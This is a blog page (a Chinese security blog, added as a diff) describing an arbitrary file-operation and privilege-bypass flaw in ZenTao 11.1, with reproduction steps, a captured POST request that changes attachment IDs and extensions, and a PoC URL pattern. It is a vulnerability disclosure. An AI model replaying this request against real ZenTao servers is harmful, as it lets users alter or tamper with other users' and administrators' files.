@@ -1,0 +1,641 @@
+
+ <!DOCTYPE HTML>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8">
+  
+    <title>禅道11.1任意文件操作+越权 | novy&#39;s Blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="novy&#39;s Blog">
+    
+
+    
+    <meta name="description" content="禅道漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="禅道11.1任意文件操作+越权">
+<meta property="og:url" content="http://example.com/2019/02/09/5/index.html">
+<meta property="og:site_name" content="novy&#39;s Blog">
+<meta property="og:description" content="禅道漏洞">
+<meta property="og:locale">
+<meta property="og:image" content="https://assets.baklib.com/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1596161054136.png">
+<meta property="og:image" content="https://assets.baklib.com/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1596161064549.png">
+<meta property="og:image" content="https://assets.baklib.com/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1596161074613.png">
+<meta property="og:image" content="https://assets.baklib.com/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1596161087405.png">
+<meta property="og:image" content="https://assets.baklib.com/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1596161103101.png">
+<meta property="og:image" content="https://assets.baklib.com/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1596161117191.png">
+<meta property="og:image" content="https://assets.baklib.com/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1596161131748.png">
+<meta property="og:image" content="https://assets.baklib.com/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1596161145047.png">
+<meta property="article:published_time" content="2019-02-09T10:04:58.000Z">
+<meta property="article:modified_time" content="2020-11-09T10:10:10.580Z">
+<meta property="article:author" content="novy&#39;s Blog">
+<meta property="article:tag" content="OWASPTOP10漏洞">
+<meta property="article:tag" content="任意文件操作">
+<meta property="article:tag" content="越权">
+<meta property="article:tag" content="禅道项目管理系统">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://assets.baklib.com/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1596161054136.png">
+
+    
+    <link rel="alternative" href="/atom.xml" title="novy&#39;s Blog" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/logo2.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/logo2.jpg">
+    
+    
+<link rel="stylesheet" href="/css/style.css">
+<link rel="stylesheet" href="/%02.css">
+<link rel="stylesheet" href="/.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/logo2.jpg" alt="novy&#39;s Blog" title="novy&#39;s Blog"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="novy&#39;s Blog">novy&#39;s Blog</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search" />
+						<input type="hidden" name="q" value="site:example.com">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+  
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2019/02/09/5/" title="禅道11.1任意文件操作+越权" itemprop="url">禅道11.1任意文件操作+越权</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="novy&#39;s Blog" target="_blank" itemprop="author">novy&#39;s Blog</a>
+		
+  <p class="article-time">
+    <time datetime="2019-02-09T10:04:58.000Z" itemprop="datePublished"> Published 2019-02-09</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">Contents</strong>
+		
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">一、任意文件操作：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E8%B6%8A%E6%9D%83"><span class="toc-number">2.</span> <span class="toc-text">二、越权</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9EPOC"><span class="toc-number">3.</span> <span class="toc-text">漏洞POC</span></a></li></ol>
+		
+		</div>
+		
+		<h1 id="一、任意文件操作："><a href="#一、任意文件操作：" class="headerlink" title="一、任意文件操作："></a>一、任意文件操作：</h1><p>管理员随便发布一个项目，然后管理员到后台分配一个会员：<br><a target="_blank" rel="noopener" href="http://127.0.0.1:1236/company-browse.html">http://127.0.0.1:1236/company-browse.html</a><br><img src="https://assets.baklib.com/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1596161054136.png"><br>登录这个novy的帐号，去提BUG（评论）：<br><a target="_blank" rel="noopener" href="http://127.0.0.1:1236/bug-browse-1.html">http://127.0.0.1:1236/bug-browse-1.html</a><br><img src="https://assets.baklib.com/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1596161064549.png"><br>随便上传一个允许上传的附件，保存然后点重命名：<br><img src="https://assets.baklib.com/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1596161074613.png"><br>然后抓包获取数据包，把后缀名改了rar<br><img src="https://assets.baklib.com/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1596161087405.png"><br>刷新一遍页面即可看到修改后的文件<br><img src="https://assets.baklib.com/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1596161103101.png"><br><code>http://127.0.0.1:1236/file-edit-1.html</code>此处的请求为评论的顺序，想改哪个就把请求改成对应顺序id，<br>比如：改成<a target="_blank" rel="noopener" href="http://127.0.0.1:1236/file-edit-2.html%E5%8D%B3%E8%A1%A8%E7%A4%BA%E6%94%B9%E7%AC%AC%E4%BA%8C%E4%B8%AA%E9%99%84%E4%BB%B6%EF%BC%9A">http://127.0.0.1:1236/file-edit-2.html即表示改第二个附件：</a><br><img src="https://assets.baklib.com/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1596161117191.png"><br><img src="https://assets.baklib.com/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1596161131748.png"></p>
+<h1 id="二、越权"><a href="#二、越权" class="headerlink" title="二、越权"></a>二、越权</h1><p>登陆后先重命名自己的附件，抓包获取链接，然后把id改为其他人的附件id即可：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /file-edit-4.html HTTP/1.1 </span><br><span class="line">Host: 127.0.0.1:1236 </span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:64.0) Gecko/20100101 Firefox/64.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate </span><br><span class="line">Referer: http://127.0.0.1:1236/file-edit-2.html  //此处为越权链接 </span><br><span class="line">Content-Type: application/x-www-form-urlencoded Content-Length: 24 </span><br><span class="line">Connection: close </span><br><span class="line">Cookie:; device=desktop; theme=default; lastProduct=1; preBranch=0; preProductID=1; checkedItem=; from=product; docFilesViewType=card; zentaosid=ikitlp7bger294dpts96l9v754; windowWidth=400; windowHeight=151; qaBugOrder=id_desc Upgrade-Insecure-Requests: 1 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fileName=1&amp;extension=rar  //此处为文件操作</span><br></pre></td></tr></table></figure>
+
+<p>修改管理员文件：<br><img src="https://assets.baklib.com/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1596161145047.png"></p>
+<h1 id="漏洞POC"><a href="#漏洞POC" class="headerlink" title="漏洞POC"></a>漏洞POC</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:1236/file-edit-2.html （http://localhost/file-edit-ID.html）</span><br></pre></td></tr></table></figure>  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">漏洞挖掘</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/OWASPTOP10漏洞/">OWASPTOP10漏洞</a><a href="/tags/任意文件操作/">任意文件操作</a><a href="/tags/越权/">越权</a><a href="/tags/禅道项目管理系统/">禅道项目管理系统</a>
+  </div>
+
+</div>
+
+
+
+	<div class="article-share" id="share">
+	
+	  <div data-url="http://example.com/2019/02/09/5/" data-title="禅道11.1任意文件操作+越权 | novy&#39;s Blog" data-tsina="" class="share clearfix">
+	  </div>
+	
+	</div>
+
+
+</footer>
+
+   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/2019/06/20/1/" title="印象笔记6.18.8.718最新版XSS漏洞">
+  <strong>上一篇：</strong><br/>
+  <span>
+  印象笔记6.18.8.718最新版XSS漏洞</span>
+</a>
+</div>
+
+
+<div class="next">
+<a href="/2019/01/09/12/"  title="齐博CMS审计-SSRF">
+ <strong>下一篇：</strong><br/> 
+ <span>齐博CMS审计-SSRF
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+
+
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">Contents</strong>
+ 
+ <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">一、任意文件操作：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E8%B6%8A%E6%9D%83"><span class="toc-number">2.</span> <span class="toc-text">二、越权</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9EPOC"><span class="toc-number">3.</span> <span class="toc-text">漏洞POC</span></a></li></ol>
+ 
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+
+  
+<div class="github-card">
+<p class="asidetitle">Github Card</p>
+<div class="github-card" data-github="novysodope" data-theme="medium"></div>
+<script type="text/javascript" src="//cdn.jsdelivr.net/github-cards/latest/widget.js" ></script>
+</div>
+
+
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">Categories</p>
+		<ul>
+		
+		  
+			<li><a href="/categories/JAVA/" title="JAVA">JAVA<sup>4</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/python/" title="python">python<sup>4</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/代码审计/" title="代码审计">代码审计<sup>10</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/免杀/" title="免杀">免杀<sup>2</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/安卓测试/" title="安卓测试">安卓测试<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/客户端漏洞/" title="客户端漏洞">客户端漏洞<sup>2</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/插件/" title="插件">插件<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/渗透实战/" title="渗透实战">渗透实战<sup>3</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/漏洞挖掘/" title="漏洞挖掘">漏洞挖掘<sup>5</sup></a></li>
+		  
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">Tags</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/JAVA代码审计/" title="JAVA代码审计">JAVA代码审计<sup>7</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/php代码审计/" title="php代码审计">php代码审计<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/JAVA/" title="JAVA">JAVA<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/python小工具/" title="python小工具">python小工具<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/python/" title="python">python<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/OWASPTOP10漏洞/" title="OWASPTOP10漏洞">OWASPTOP10漏洞<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/cobalt-strike后门/" title="cobalt strike后门">cobalt strike后门<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/免杀/" title="免杀">免杀<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/印象笔记/" title="印象笔记">印象笔记<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/XSS/" title="XSS">XSS<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/反序列化/" title="反序列化">反序列化<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/有道云笔记/" title="有道云笔记">有道云笔记<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Cobalt-Strike/" title="Cobalt Strike">Cobalt Strike<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/IDEA/" title="IDEA">IDEA<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/XSS绕过/" title="XSS绕过">XSS绕过<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/浏览器密码提取/" title="浏览器密码提取">浏览器密码提取<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/实战/" title="实战">实战<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/HW/" title="HW">HW<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/spring-boot模板注入/" title="spring boot模板注入">spring boot模板注入<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/提权/" title="提权">提权<sup>1</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">Links</p>
+    <ul>
+        
+          <li>
+            
+            	<a href="https://whitecap100" target="_blank" title="分享技术文章，分享骚姿势">白帽100安全攻防实验室</a>
+            
+          </li>
+        
+    </ul>
+</div>
+
+  <div class="rsspart">
+	<a href="/atom.xml" target="_blank" title="rss">RSS</a>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer>
+<div id="footer" >
+	
+	<div class="line">
+		<span></span>
+		<div class="author"></div>
+	</div>
+	
+	
+	<section class="info">
+		<p> 记录日常所学所遇. <br/>
+			Have a great fucking day!</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		
+		<a href="https://github.com/novysodope" target="_blank" class="icon-github" title="github"></a>
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		<a href="mailto:novysodope@gmail.com" target="_blank" class="icon-email" title="Email Me"></a>
+		
+	</div>
+			
+		
+
+		<p class="copyright">
+		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> © 2020 
+		
+		<a href="/about" target="_blank" title="novy&#39;s Blog">novy&#39;s Blog</a>
+		
+		<br />
+		<script>
+    function secondToDate(second) {
+        if (!second) {
+            return 0;
+        }
+        var time = new Array(0, 0, 0, 0, 0);
+        if (second >= 365 * 24 * 3600) {
+            time[0] = parseInt(second / (365 * 24 * 3600));
+            second %= 365 * 24 * 3600;
+        }
+        if (second >= 24 * 3600) {
+            time[1] = parseInt(second / (24 * 3600));
+            second %= 24 * 3600;
+        }
+        if (second >= 3600) {
+            time[2] = parseInt(second / 3600);
+            second %= 3600;
+        }
+        if (second >= 60) {
+            time[3] = parseInt(second / 60);
+            second %= 60;
+        }
+        if (second > 0) {
+            time[4] = second;
+        }
+        return time;
+    }</script><script type="text/javascript" language="javascript">
+    function setTime() {
+        var create_time = Math.round(new Date(Date.UTC(2020, 11, 09, 6, 6, 6)).getTime() / 1000);
+        var timestamp = Math.round((new Date().getTime() + 8 * 60 * 60 * 1000) / 1000);
+        currentTime = secondToDate((timestamp - create_time));
+        currentTimeHtml = currentTime[0] + '年' + currentTime[1] + '天'
+                + currentTime[2] + '时' + currentTime[3] + '分' + currentTime[4]
+                + '秒';
+        document.getElementById("htmer_time").innerHTML = currentTimeHtml;
+    }    setInterval(setTime, 1000);</script>
+    本博客已经稳定运行：<span id="htmer_time" style="color: #2ca6cb;"></span>
+		</p>
+
+</div>
+
+</footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<div class="hoverqrcode clearfix"></div>',
+  '<a class="overlay" id="qrcode"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+
+  $('.hoverqrcode').hide();
+
+  var myWidth = 0;
+  function updatehoverqrcode(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+    var qrsize = myWidth > 1024 ? 200:100;
+    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
+    var p = $('.article-share-qrcode').position();
+    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
+                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
+                          .qrcode(options);
+  };
+  $(window).resize(function(){
+    $('.hoverqrcode').hide();
+  });
+  $('.article-share-qrcode').click(function(){
+    updatehoverqrcode();
+    $('.hoverqrcode').toggle();
+  });
+  $('.article-share-qrcode').hover(function(){}, function(){
+      $('.hoverqrcode').hide();
+  });
+});   
+</script>
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?e6d1f421bbc9962127a50488f9ed37d1";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="Back to Top"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  </body>
+</html>
